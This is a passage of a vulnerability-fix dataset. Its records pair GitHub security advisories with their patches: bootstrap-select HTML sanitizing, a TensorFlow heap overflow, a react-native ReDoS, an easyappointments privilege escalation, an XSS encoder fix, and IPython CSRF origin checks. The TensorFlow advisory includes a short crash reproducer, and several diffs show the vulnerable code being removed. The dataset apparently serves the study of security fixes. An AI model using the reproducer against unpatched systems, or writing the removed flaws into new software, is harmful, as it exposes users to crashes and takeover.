'https:\/\/github.com\/snapappointments\/bootstrap-select\/raw\/ab6e068748040cf3cda5859f6349b382402b8767\/js%2Fbootstrap-select.js', 'patch': \"@@ -1,6 +1,128 @@\\n (function ($) {\\n   'use strict';\\n \\n+  var DISALLOWED_ATTRIBUTES = ['sanitize', 'whiteList', 'sanitizeFn'];\\n+\\n+  var uriAttrs = [\\n+    'background',\\n+    'cite',\\n+    'href',\\n+    'itemtype',\\n+    'longdesc',\\n+    'poster',\\n+    'src',\\n+    'xlink:href'\\n+  ];\\n+\\n+  var ARIA_ATTRIBUTE_PATTERN = \/^aria-[\\\\w-]*$\/i;\\n+\\n+  var DefaultWhitelist = {\\n+    \/\/ Global attributes allowed on any supplied element below.\\n+    '*': ['class', 'dir', 'id', 'lang', 'role', 'tabindex', 'style', ARIA_ATTRIBUTE_PATTERN],\\n+    a: ['target', 'href', 'title', 'rel'],\\n+    area: [],\\n+    b: [],\\n+    br: [],\\n+    col: [],\\n+    code: [],\\n+    div: [],\\n+    em: [],\\n+    hr: [],\\n+    h1: [],\\n+    h2: [],\\n+    h3: [],\\n+    h4: [],\\n+    h5: [],\\n+    h6: [],\\n+    i: [],\\n+    img: ['src', 'alt', 'title', 'width', 'height'],\\n+    li: [],\\n+    ol: [],\\n+    p: [],\\n+    pre: [],\\n+    s: [],\\n+    small: [],\\n+    span: [],\\n+    sub: [],\\n+    sup: [],\\n+    strong: [],\\n+    u: [],\\n+    ul: []\\n+  }\\n+\\n+  \/**\\n+   * A pattern that recognizes a commonly useful subset of URLs that are safe.\\n+   *\\n+   * Shoutout to Angular 7 https:\/\/github.com\/angular\/angular\/blob\/7.2.4\/packages\/core\/src\/sanitization\/url_sanitizer.ts\\n+   *\/\\n+  var SAFE_URL_PATTERN = \/^(?:(?:https?|mailto|ftp|tel|file):|[^&:\/?#]*(?:[\/?#]|$))\/gi;\\n+\\n+  \/**\\n+   * A pattern that matches safe data URLs. Only matches image, video and audio types.\\n+   *\\n+   * Shoutout to Angular 7 https:\/\/github.com\/angular\/angular\/blob\/7.2.4\/packages\/core\/src\/sanitization\/url_sanitizer.ts\\n+   *\/\\n+  var DATA_URL_PATTERN = \/^data:(?:image\\\\\/(?:bmp|gif|jpeg|jpg|png|tiff|webp)|video\\\\\/(?:mpeg|mp4|ogg|webm)|audio\\\\\/(?:mp3|oga|ogg|opus));base64,[a-z0-9+\/]+=*$\/i;\\n+\\n+  function allowedAttribute (attr, allowedAttributeList) {\\n+    var attrName = attr.nodeName.toLowerCase()\\n+\\n+    if ($.inArray(attrName, allowedAttributeList) !== -1) {\\n+      if ($.inArray(attrName, uriAttrs) !== -1) {\\n+        return Boolean(attr.nodeValue.match(SAFE_URL_PATTERN) || attr.nodeValue.match(DATA_URL_PATTERN))\\n+      }\\n+\\n+      return true\\n+    }\\n+\\n+    var regExp = $(allowedAttributeList).filter(function (index, value) {\\n+      return value instanceof RegExp\\n+    })\\n+\\n+    \/\/ Check if a regular expression validates the attribute.\\n+    for (var i = 0, l = regExp.length; i < l; i++) {\\n+      if (attrName.match(regExp[i])) {\\n+        return true\\n+      }\\n+    }\\n+\\n+    return false\\n+  }\\n+\\n+  function sanitizeHtml (unsafeElements, whiteList, sanitizeFn) {\\n+    if (sanitizeFn && typeof sanitizeFn === 'function') {\\n+      return sanitizeFn(unsafeElements);\\n+    }\\n+\\n+    var whitelistKeys = Object.keys(whiteList);\\n+\\n+    for (var i = 0, len = unsafeElements.length; i < len; i++) {\\n+      var elements = unsafeElements[i].querySelectorAll('*');\\n+\\n+      for (var j = 0, len2 = elements.length; j < len2; j++) {\\n+        var el = elements[j];\\n+        var elName = el.nodeName.toLowerCase();\\n+\\n+        if (whitelistKeys.indexOf(elName) === -1) {\\n+          el.parentNode.removeChild(el);\\n+\\n+          continue;\\n+        }\\n+\\n+        var attributeList = [].slice.call(el.attributes);\\n+        var whitelistedAttributes = [].concat(whiteList['*'] || [], whiteList[elName] || []);\\n+\\n+        for (var k = 0, len3 = attributeList.length; k < len3; k++) {\\n+          var attr = attributeList[k];\\n+\\n+          if (!allowedAttribute(attr, whitelistedAttributes)) {\\n+            el.removeAttribute(attr.nodeName);\\n+          }\\n+        }\\n+      }\\n+    }\\n+  }\\n+\\n   \/\/ Polyfill for browsers with no classList support\\n   \/\/ Remove in v2\\n   if (!('classList' in document.createElement('_'))) {\\n@@ -745,7 +867,10 @@\\n     dropdownAlignRight: false,\\n     windowPadding: 0,\\n     virtualScroll: 600,\\n-    display: false\\n+    display: false,\\n+    sanitize: true,\\n+    sanitizeFn: null,\\n+    whiteList: DefaultWhitelist\\n   };\\n \\n   if (version.major === '4') {\\n@@ -1100,13 +1225,35 @@\\n                 emptyMenu = menuInner.firstChild.cloneNode(false),\\n                 marginTop,\\n                 marginBottom,\\n-                elements = isVirtual === true ? that.selectpicker.view.visibleElements : that.selectpicker.current.elements;\\n+                elements = isVirtual === true ? that.selectpicker.view.visibleElements : that.selectpicker.current.elements,\\n+                toSanitize = [];\\n \\n             \/\/ replace the existing UL with an empty one - this is faster than $.empty()\\n             menuInner.replaceChild(emptyMenu, menuInner.firstChild);\\n \\n             for (var i = 0, visibleElementsLen = elements.length; i < visibleElementsLen; i++) {\\n-              menuFragment.appendChild(elements[i]);\\n+              var element = elements[i],\\n+                  elText,\\n+                  elementData;\\n+\\n+              if (that.options.sanitize) {\\n+                elText = element.lastChild;\\n+\\n+                if (elText) {\\n+                  elementData = that.selectpicker.current.data[i + that.selectpicker.view.position0].data;\\n+\\n+                  if (elementData && elementData.content && !elementData.sanitized) {\\n+                    toSanitize.push(elText);\\n+                    elementData.sanitized = true;\\n+                  }\\n+                }\\n+              }\\n+\\n+              menuFragment.appendChild(element);\\n+            }\\n+\\n+            if (that.options.sanitize && toSanitize.length) {\\n+              sanitizeHtml(toSanitize, that.options.whiteList, that.options.sanitizeFn);\\n             }\\n \\n             if (isVirtual === true) {\\n@@ -1469,7 +1616,8 @@\\n           multipleSeparator = document.createTextNode(this.options.multipleSeparator),\\n           titleFragment = elementTemplates.fragment.cloneNode(false),\\n           showCount,\\n-          countMax;\\n+          countMax,\\n+          hasContent = false;\\n \\n       this.togglePlaceholder();\\n \\n@@ -1506,6 +1654,7 @@\\n                 titleOptions.text = option.title;\\n               } else if (thisData.content && that.options.showContent) {\\n                 titleOptions.optionContent = thisData.content.toString();\\n+                hasContent = true;\\n               } else {\\n                 if (that.options.showIcon) {\\n                   titleOptions.optionIcon = thisData.icon;\\n@@ -1554,6 +1703,10 @@\\n       \/\/ strip all HTML tags and trim the result, then unescape any escaped tags\\n       this.$button[0].title = titleFragment.textContent.replace(\/<[^>]*>?\/g, '').trim();\\n \\n+      if (this.options.sanitize && hasContent) {\\n+        sanitizeHtml([titleFragment], that.options.whiteList, that.options.sanitizeFn);\\n+      }\\n+\\n       buttonInner.innerHTML = '';\\n       buttonInner.appendChild(titleFragment);\\n \\n@@ -2833,8 +2986,16 @@\\n             options = typeof _option == 'object' && _option;\\n \\n         if (!data) {\\n-          var config = $.extend({}, Selectpicker.DEFAULTS, $.fn.selectpicker.defaults || {}, $this.data(), options);\\n-          config.template = $.extend({}, Selectpicker.DEFAULTS.template, ($.fn.selectpicker.defaults ? $.fn.selectpicker.defaults.template : {}), $this.data().template, options.template);\\n+          var dataAttributes = $this.data();\\n+\\n+          for (var dataAttr in dataAttributes) {\\n+            if (dataAttributes.hasOwnProperty(dataAttr) && $.inArray(dataAttr, DISALLOWED_ATTRIBUTES) !== -1) {\\n+              delete dataAttributes[dataAttr];\\n+            }\\n+          }\\n+\\n+          var config = $.extend({}, Selectpicker.DEFAULTS, $.fn.selectpicker.defaults || {}, dataAttributes, options);\\n+          config.template = $.extend({}, Selectpicker.DEFAULTS.template, ($.fn.selectpicker.defaults ? $.fn.selectpicker.defaults.template : {}), dataAttributes.template, options.template);\\n           $this.data('selectpicker', (data = new Selectpicker(this, config)));\\n         } else if (options) {\\n           for (var i in options) {\"}}","message_norm":"add sanitize option for data-content (#2199)","language":"it","entities":"[('add', 'ACTION', ''), ('sanitize', 'SECWORD', ''), ('#2199', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['js\/bootstrap-select.js'])","num_files":1.0},{"index":1013,"vuln_id":"GHSA-7cqx-92hp-x6wh","cwe_id":"{'CWE-787', 'CWE-119'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/63c6a29d0f2d692b247f7bf81f8732d6442fad09'}","dataset":"osv","summary":"Heap buffer overflow in `MaxPool3DGradGrad` ### Impact\nThe implementation of `tf.raw_ops.MaxPool3DGradGrad` is vulnerable to a heap buffer overflow: \n\n```python\nimport tensorflow as tf\n\nvalues = [0.01] * 11\norig_input = tf.constant(values, shape=[11, 1, 1, 1, 1], dtype=tf.float32)\norig_output = tf.constant([0.01], shape=[1, 1, 1, 1, 1], dtype=tf.float32)\ngrad = tf.constant([0.01], shape=[1, 1, 1, 1, 1], dtype=tf.float32)\nksize = [1, 1, 1, 1, 1]\nstrides = [1, 1, 1, 1, 1]\npadding = \"SAME\"\n\ntf.raw_ops.MaxPool3DGradGrad(\n    orig_input=orig_input, orig_output=orig_output, grad=grad, ksize=ksize,\n    strides=strides, padding=padding)\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/596c05a159b6fbb9e39ca10b3f7753b7244fa1e9\/tensorflow\/core\/kernels\/pooling_ops_3d.cc#L694-L696) does not check that the initialization of `Pool3dParameters` completes successfully:\n\n```cc\nPool3dParameters params{context,  ksize_,       stride_,\n                        padding_, data_format_, tensor_in.shape()};\n```\n\nSince [the constructor](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/596c05a159b6fbb9e39ca10b3f7753b7244fa1e9\/tensorflow\/core\/kernels\/pooling_ops_3d.cc#L48-L88) uses `OP_REQUIRES` to validate conditions, the first assertion that fails interrupts the initialization of `params`, making it contain invalid data. In turn, this might cause a heap buffer overflow, depending on default initialized values.\n\n### Patches\nWe have patched the issue in GitHub commit [63c6a29d0f2d692b247f7bf81f8732d6442fad09](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/63c6a29d0f2d692b247f7bf81f8732d6442fad09).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/63c6a29d0f2d692b247f7bf81f8732d6442fad09","commit_sha":"63c6a29d0f2d692b247f7bf81f8732d6442fad09","patch":"SINGLE","chain_ord":"['63c6a29d0f2d692b247f7bf81f8732d6442fad09']","before_first_fix_commit":"{'596c05a159b6fbb9e39ca10b3f7753b7244fa1e9'}","last_fix_commit":"63c6a29d0f2d692b247f7bf81f8732d6442fad09","chain_ord_pos":1.0,"commit_datetime":"05\/06\/2021, 01:07:02","message":"Add missing validation, prevent heap OOB\n\nPiperOrigin-RevId: 372246723\nChange-Id: I1a454a643810e77d7d14821b342098c56a09fbbf","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 12, 'deletions': 0, 'total': 12}","files":"{'tensorflow\/core\/kernels\/pooling_ops_3d.cc': {'additions': 12, 'deletions': 0, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/63c6a29d0f2d692b247f7bf81f8732d6442fad09\/tensorflow%2Fcore%2Fkernels%2Fpooling_ops_3d.cc', 'patch': '@@ -693,6 +693,7 @@ class MaxPooling3dGradGradOp : public OpKernel {\\n \\n     Pool3dParameters params{context,  ksize_,       stride_,\\n                             padding_, data_format_, tensor_in.shape()};\\n+    if (!context->status().ok()) return;  \/\/ params is invalid\\n \\n     Tensor* output = nullptr;\\n     OP_REQUIRES_OK(context, context->forward_input_or_allocate_output(\\n@@ -710,6 +711,17 @@ class MaxPooling3dGradGradOp : public OpKernel {\\n         context, out_grad_backprop.NumElements() > 0,\\n         errors::InvalidArgument(\"received empty tensor out_grad_backprop: \",\\n                                 out_grad_backprop.DebugString()));\\n+    OP_REQUIRES(context,\\n+                tensor_in.NumElements() == out_grad_backprop.NumElements(),\\n+                errors::InvalidArgument(\"tensor_in and out_grad_backprop must \"\\n+                                        \"have same number of elements, got <\",\\n+                                        tensor_in.DebugString(), \"> and <\",\\n+                                        out_grad_backprop.DebugString(), \">\"));\\n+    OP_REQUIRES(\\n+        context, tensor_out.NumElements() == output->NumElements(),\\n+        errors::InvalidArgument(\\n+            \"tensor_out and output must have same number of elements, got <\",\\n+            tensor_out.DebugString(), \"> and <\", output->DebugString(), \">\"));\\n \\n     LaunchMaxPooling3dGradGradOp<Device, T>::launch(\\n         context, params, tensor_in, tensor_out, out_grad_backprop, output);'}}","message_norm":"add missing validation, prevent heap oob\n\npiperorigin-revid: 372246723\nchange-id: i1a454a643810e77d7d14821b342098c56a09fbbf","language":"en","entities":"[('add', 'ACTION', ''), ('missing validation', 'SECWORD', ''), ('prevent', 'ACTION', ''), ('heap oob', 'SECWORD', ''), ('372246723', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/pooling_ops_3d.cc'])","num_files":1.0},{"index":1017,"vuln_id":"GHSA-7f53-fmmv-mfjv","cwe_id":"{'CWE-400'}","score":7.5,"chain":"{'https:\/\/github.com\/facebook\/react-native\/commit\/ca09ae82715e33c9ac77b3fa55495cf84ba891c7'}","dataset":"osv","summary":"Regular expression denial of service in react-native A regular expression denial of service (ReDoS) vulnerability in the validateBaseUrl function can cause the application to use excessive resources, become unresponsive, or crash. This was introduced in react-native version 0.59.0 and fixed in version 0.64.1.","published_date":"2021-07-20","chain_len":1,"project":"https:\/\/github.com\/facebook\/react-native","commit_href":"https:\/\/github.com\/facebook\/react-native\/commit\/ca09ae82715e33c9ac77b3fa55495cf84ba891c7","commit_sha":"ca09ae82715e33c9ac77b3fa55495cf84ba891c7","patch":"SINGLE","chain_ord":"['ca09ae82715e33c9ac77b3fa55495cf84ba891c7']","before_first_fix_commit":"{'166a5ddf88aca0d0235e48c624681eec095e9ef8'}","last_fix_commit":"ca09ae82715e33c9ac77b3fa55495cf84ba891c7","chain_ord_pos":1.0,"commit_datetime":"04\/29\/2021, 21:51:29","message":"Update validateBaseUrl to use latest regex\n\nSummary:\nUpdating the regex to avoid a potential regular expression denial-of-service vulnerability.\n\nChangelog: Update validateBaseUrl to use a more robust regular expression. Fixes CVE-2020-1920, GHSL-2020-293\n\nReviewed By: lunaleaps\n\nDifferential Revision: D25507604\n\nfbshipit-source-id: c36a03c456881bc655c861e1a2c5cd41a7127c9d","author":"Neal Poole","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'Libraries\/Blob\/URL.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/facebook\/react-native\/raw\/ca09ae82715e33c9ac77b3fa55495cf84ba891c7\/Libraries%2FBlob%2FURL.js', 'patch': '@@ -107,7 +107,7 @@ export class URLSearchParams {\\n \\n function validateBaseUrl(url: string) {\\n   \/\/ from this MIT-licensed gist: https:\/\/gist.github.com\/dperini\/729294\\n-  return \/^(?:(?:(?:https?|ftp):)?\\\\\/\\\\\/)(?:(?:[1-9]\\\\d?|1\\\\d\\\\d|2[01]\\\\d|22[0-3])(?:\\\\.(?:1?\\\\d{1,2}|2[0-4]\\\\d|25[0-5])){2}(?:\\\\.(?:[1-9]\\\\d?|1\\\\d\\\\d|2[0-4]\\\\d|25[0-4]))|(?:(?:[a-z\\\\u00a1-\\\\uffff0-9]-*)*[a-z\\\\u00a1-\\\\uffff0-9]+)(?:\\\\.(?:[a-z\\\\u00a1-\\\\uffff0-9]-*)*[a-z\\\\u00a1-\\\\uffff0-9]+)*(?:\\\\.(?:[a-z\\\\u00a1-\\\\uffff]{2,}))?)(?::\\\\d{2,5})?(?:[\/?#]\\\\S*)?$\/i.test(\\n+  return \/^(?:(?:(?:https?|ftp):)?\\\\\/\\\\\/)(?:(?:[1-9]\\\\d?|1\\\\d\\\\d|2[01]\\\\d|22[0-3])(?:\\\\.(?:1?\\\\d{1,2}|2[0-4]\\\\d|25[0-5])){2}(?:\\\\.(?:[1-9]\\\\d?|1\\\\d\\\\d|2[0-4]\\\\d|25[0-4]))|(?:(?:[a-z0-9\\\\u00a1-\\\\uffff][a-z0-9\\\\u00a1-\\\\uffff_-]{0,62})?[a-z0-9\\\\u00a1-\\\\uffff]\\\\.)*(?:[a-z\\\\u00a1-\\\\uffff]{2,}\\\\.?))(?::\\\\d{2,5})?(?:[\/?#]\\\\S*)?$\/.test(\\n     url,\\n   );\\n }'}}","message_norm":"update validatebaseurl to use latest regex\n\nsummary:\nupdating the regex to avoid a potential regular expression denial-of-service vulnerability.\n\nchangelog: update validatebaseurl to use a more robust regular expression. fixes cve-2020-1920, ghsl-2020-293\n\nreviewed by: lunaleaps\n\ndifferential revision: d25507604\n\nfbshipit-source-id: c36a03c456881bc655c861e1a2c5cd41a7127c9d","language":"en","entities":"[('update', 'ACTION', ''), ('updating', 'ACTION', ''), ('denial-of-service', 'SECWORD', ''), ('vulnerability', 'SECWORD', ''), ('update', 'ACTION', ''), ('cve-2020-1920', 'VULNID', 'CVE'), ('d25507604', 'SHA', 'generic_sha'), ('c36a03c456881bc655c861e1a2c5cd41a7127c9d', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['Libraries\/Blob\/URL.js'])","num_files":1.0},{"index":1018,"vuln_id":"GHSA-7f62-4887-cfv5","cwe_id":"{'CWE-269'}","score":8.8,"chain":"{'https:\/\/github.com\/alextselegidis\/easyappointments\/commit\/63dbb51decfcc1631c398ecd6d30e3a337845526'}","dataset":"osv","summary":"Privilege escalation in easyappointments The Easy!Appointments API authorization is checked against the user's existence, without validating the permissions. As a result, a low privileged user (eg. provider) can create a new admin user via the \"\/api\/v1\/admins\/\" endpoint and take over the system. A [patch](https:\/\/github.com\/alextselegidis\/easyappointments\/commit\/63dbb51decfcc1631c398ecd6d30e3a337845526) is available on the `develop` branch of the repository.","published_date":"2022-05-11","chain_len":1,"project":"https:\/\/github.com\/alextselegidis\/easyappointments","commit_href":"https:\/\/github.com\/alextselegidis\/easyappointments\/commit\/63dbb51decfcc1631c398ecd6d30e3a337845526","commit_sha":"63dbb51decfcc1631c398ecd6d30e3a337845526","patch":"SINGLE","chain_ord":"['63dbb51decfcc1631c398ecd6d30e3a337845526']","before_first_fix_commit":"{'f0e976c9ac9be2a7e7626d2112c71042ba087dfa'}","last_fix_commit":"63dbb51decfcc1631c398ecd6d30e3a337845526","chain_ord_pos":1.0,"commit_datetime":"05\/09\/2022, 21:26:28","message":"Check the role slug in Api.php","author":"Alex Tselegidis","comments":null,"stats":"{'additions': 3, 'deletions': 1, 'total': 4}","files":"{'application\/libraries\/Api.php': {'additions': 3, 'deletions': 1, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/alextselegidis\/easyappointments\/raw\/63dbb51decfcc1631c398ecd6d30e3a337845526\/application%2Flibraries%2FApi.php', 'patch': \"@@ -77,7 +77,9 @@ public function auth()\\n \\n             $password = $_SERVER['PHP_AUTH_PW'];\\n \\n-            if ( ! $this->CI->accounts->check_login($username, $password))\\n+            $userdata = $this->CI->accounts->check_login($username, $password);\\n+\\n+            if (empty($userdata['role_slug']) || $userdata['role_slug'] !== DB_SLUG_ADMIN)\\n             {\\n                 throw new RuntimeException('The provided credentials do not match any admin user!', 401, 'Unauthorized');\\n             }\"}}","message_norm":"check the role slug in api.php","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['application\/libraries\/Api.php'])","num_files":1.0},{"index":1020,"vuln_id":"GHSA-7f63-h6g3-7cwm","cwe_id":"{'CWE-79'}","score":6.1,"chain":"{'https:\/\/github.com\/Finastra\/ssr-pages\/pull\/2\/commits\/133606ffaec2edd9918d9fba5771ed21da7876a5', 'https:\/\/github.com\/Finastra\/ssr-pages\/commit\/98abc59e28fec48246be0d59ac144675d6361073'}","dataset":"osv","summary":"Cross Site Scripting (XSS) in @finastra\/ssr-pages A cross site scripting (XSS) issue can occur when providing untrusted input to the `redirect.link` property as an argument to the `build(MessagePageOptions)` function.\n\n### References\n- https:\/\/github.com\/Finastra\/ssr-pages\/pull\/2\n- https:\/\/github.com\/Finastra\/ssr-pages\/pull\/2\/commits\/133606ffaec2edd9918d9fba5771ed21da7876a5\n- https:\/\/github.com\/Finastra\/ssr-pages\/commit\/98abc59e28fec48246be0d59ac144675d6361073","published_date":"2022-03-01","chain_len":2,"project":"https:\/\/github.com\/Finastra\/ssr-pages","commit_href":"https:\/\/github.com\/Finastra\/ssr-pages\/commit\/98abc59e28fec48246be0d59ac144675d6361073","commit_sha":"98abc59e28fec48246be0d59ac144675d6361073","patch":"MULTI","chain_ord":"['133606ffaec2edd9918d9fba5771ed21da7876a5', '98abc59e28fec48246be0d59ac144675d6361073']","before_first_fix_commit":"{'ea07d3fca4b5b84aab889391c100f9bf71333ded'}","last_fix_commit":"98abc59e28fec48246be0d59ac144675d6361073","chain_ord_pos":2.0,"commit_datetime":"02\/27\/2022, 18:45:49","message":"fix string encoder","author":"David Bocl\u00e9","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/helpers\/string-encoder.helper.ts': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Finastra\/ssr-pages\/raw\/98abc59e28fec48246be0d59ac144675d6361073\/src%2Fhelpers%2Fstring-encoder.helper.ts', 'patch': \"@@ -2,7 +2,7 @@ export function stringEncode(string: string) {\\n     let encodedString = '';\\r\\n     for (let i = 0; i < string.length; i++) {\\r\\n         let charCodePointHex = string.charCodeAt(i).toString(16);\\r\\n-        encodedString += `\\\\\\\\u${charCodePointHex}`;\\r\\n+        encodedString += `\\\\\\\\u{${charCodePointHex}}`;\\r\\n     }\\r\\n     return encodedString;\\r\\n }\\n\\\\ No newline at end of file\"}}","message_norm":"fix string encoder","language":"da","entities":"[('fix', 'ACTION', ''), ('encoder', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/helpers\/string-encoder.helper.ts'])","num_files":1.0},{"index":1021,"vuln_id":"GHSA-7fc2-rm35-2pp7","cwe_id":"{'CWE-352'}","score":8.8,"chain":"{'https:\/\/github.com\/ipython\/ipython\/commit\/1415a9710407e7c14900531813c15ba6165f0816', 'https:\/\/github.com\/ipython\/ipython\/commit\/a05fe052a18810e92d9be8c1185952c13fe4e5b0'}","dataset":"osv","summary":"IPython vulnerable to cross site request forgery (CSRF) IPython (Interactive Python) is a command shell. Cross-site request forgery in the REST API is possible in in IPython 2 and 3. Versions 2.4.1 and 3.2.3 contain patches.","published_date":"2022-05-17","chain_len":2,"project":"https:\/\/github.com\/ipython\/ipython","commit_href":"https:\/\/github.com\/ipython\/ipython\/commit\/1415a9710407e7c14900531813c15ba6165f0816","commit_sha":"1415a9710407e7c14900531813c15ba6165f0816","patch":"MULTI","chain_ord":"['1415a9710407e7c14900531813c15ba6165f0816', 'a05fe052a18810e92d9be8c1185952c13fe4e5b0']","before_first_fix_commit":"{'6884e8b36dc1e2d59e1d8ddb5e95788728d76e6f'}","last_fix_commit":"a05fe052a18810e92d9be8c1185952c13fe4e5b0","chain_ord_pos":1.0,"commit_datetime":"07\/08\/2015, 07:11:16","message":"check origin of API requests\n\nprotects agains CSRF on POST endpoints via forms.","author":"Min RK","comments":null,"stats":"{'additions': 48, 'deletions': 1, 'total': 49}","files":"{'IPython\/html\/base\/handlers.py': {'additions': 48, 'deletions': 1, 'changes': 49, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/ipython\/ipython\/raw\/1415a9710407e7c14900531813c15ba6165f0816\/IPython%2Fhtml%2Fbase%2Fhandlers.py', 'patch': '@@ -5,7 +5,6 @@\\n \\n import functools\\n import json\\n-import logging\\n import os\\n import re\\n import sys\\n@@ -15,6 +14,10 @@\\n     from http.client import responses\\n except ImportError:\\n     from httplib import responses\\n+try:\\n+    from urllib.parse import urlparse # Py 3\\n+except ImportError:\\n+    from urlparse import urlparse # Py 2\\n \\n from jinja2 import TemplateNotFound\\n from tornado import web\\n@@ -320,6 +323,50 @@ def write_error(self, status_code, **kwargs):\\n class APIHandler(IPythonHandler):\\n     \"\"\"Base class for API handlers\"\"\"\\n     \\n+    def check_origin(self):\\n+        \"\"\"Check Origin for cross-site API requests.\\n+        \\n+        Copied from WebSocket with changes:\\n+        \\n+        - allow unspecified host\/origin (e.g. scripts)\\n+        \"\"\"\\n+        if self.allow_origin == \\'*\\':\\n+            return True\\n+\\n+        host = self.request.headers.get(\"Host\")\\n+        origin = self.request.headers.get(\"Origin\")\\n+\\n+        # If no header is provided, assume it comes from a script\/curl.\\n+        # We are only concerned with cross-site browser stuff here.\\n+        if origin is None or host is None:\\n+            return True\\n+        \\n+        origin = origin.lower()\\n+        origin_host = urlparse(origin).netloc\\n+        \\n+        # OK if origin matches host\\n+        if origin_host == host:\\n+            return True\\n+        \\n+        # Check CORS headers\\n+        if self.allow_origin:\\n+            allow = self.allow_origin == origin\\n+        elif self.allow_origin_pat:\\n+            allow = bool(self.allow_origin_pat.match(origin))\\n+        else:\\n+            # No CORS headers deny the request\\n+            allow = False\\n+        if not allow:\\n+            self.log.warn(\"Blocking Cross Origin API request.  Origin: %s, Host: %s\",\\n+                origin, host,\\n+            )\\n+        return allow\\n+\\n+    def prepare(self):\\n+        if not self.check_origin():\\n+            raise web.HTTPError(404)\\n+        return super(APIHandler, self).prepare()\\n+\\n     @property\\n     def content_security_policy(self):\\n         csp = \\'; \\'.join(['}}","message_norm":"check origin of api requests\n\nprotects agains csrf on post endpoints via forms.","language":"en","entities":"[('protects', 'ACTION', ''), ('csrf', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['IPython\/html\/base\/handlers.py'])","num_files":1.0},{"index":1022,"vuln_id":"GHSA-7fc2-rm35-2pp7","cwe_id":"{'CWE-352'}","score":8.8,"chain":"{'https:\/\/github.com\/ipython\/ipython\/commit\/1415a9710407e7c14900531813c15ba6165f0816', 'https:\/\/github.com\/ipython\/ipython\/commit\/a05fe052a18810e92d9be8c1185952c13fe4e5b0'}","dataset":"osv","summary":"IPython vulnerable to cross site request forgery (CSRF) IPython (Interactive Python) is a command shell. Cross-site request forgery in the REST API is possible in in IPython 2 and 3. Versions 2.4.1 and 3.2.3 contain patches.","published_date":"2022-05-17","chain_len":2,"project":"https:\/\/github.com\/ipython\/ipython","commit_href":"https:\/\/github.com\/ipython\/ipython\/commit\/a05fe052a18810e92d9be8c1185952c13fe4e5b0","commit_sha":"a05fe052a18810e92d9be8c1185952c13fe4e5b0","patch":"MULTI","chain_ord":"['1415a9710407e7c14900531813c15ba6165f0816', 'a05fe052a18810e92d9be8c1185952c13fe4e5b0']","before_first_fix_commit":"{'6884e8b36dc1e2d59e1d8ddb5e95788728d76e6f'}","last_fix_commit":"a05fe052a18810e92d9be8c1185952c13fe4e5b0","chain_ord_pos":2.0,"commit_datetime":"07\/12\/2015, 15:36:44","message":"backport origin check for API requests","author":"Min RK","comments":null,"stats":"{'additions': 48, 'deletions': 0, 'total': 48}","files":"{'IPython\/html\/base\/handlers.py': {'additions': 48, 'deletions': 0, 'changes': 48, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/ipython\/ipython\/raw\/a05fe052a18810e92d9be8c1185952c13fe4e5b0\/IPython%2Fhtml%2Fbase%2Fhandlers.py', 'patch': '@@ -29,6 +29,10 @@\\n     from http.client import responses\\n except ImportError:\\n     from httplib import responses\\n+try:\\n+    from urllib.parse import urlparse # Py 3\\n+except ImportError:\\n+    from urlparse import urlparse # Py 2\\n \\n from jinja2 import TemplateNotFound\\n from tornado import web\\n@@ -208,6 +212,50 @@ def get_origin(self):\\n             origin = self.request.headers.get(\"Sec-Websocket-Origin\", None)\\n         return origin\\n \\n+    def check_origin_api(self):\\n+        \"\"\"Check Origin for cross-site API requests.\\n+        \\n+        Copied from WebSocket with changes:\\n+        \\n+        - allow unspecified host\/origin (e.g. scripts)\\n+        \"\"\"\\n+        if self.allow_origin == \\'*\\':\\n+            return True\\n+\\n+        host = self.request.headers.get(\"Host\")\\n+        origin = self.request.headers.get(\"Origin\")\\n+\\n+        # If no header is provided, assume it comes from a script\/curl.\\n+        # We are only concerned with cross-site browser stuff here.\\n+        if origin is None or host is None:\\n+            return True\\n+        \\n+        origin = origin.lower()\\n+        origin_host = urlparse(origin).netloc\\n+        \\n+        # OK if origin matches host\\n+        if origin_host == host:\\n+            return True\\n+        \\n+        # Check CORS headers\\n+        if self.allow_origin:\\n+            allow = self.allow_origin == origin\\n+        elif self.allow_origin_pat:\\n+            allow = bool(self.allow_origin_pat.match(origin))\\n+        else:\\n+            # No CORS headers deny the request\\n+            allow = False\\n+        if not allow:\\n+            self.log.warn(\"Blocking Cross Origin API request.  Origin: %s, Host: %s\",\\n+                origin, host,\\n+            )\\n+        return allow\\n+\\n+    def prepare(self):\\n+        if not self.check_origin_api():\\n+            raise web.HTTPError(404)\\n+        return super(IPythonHandler, self).prepare()\\n+\\n     #---------------------------------------------------------------\\n     # template 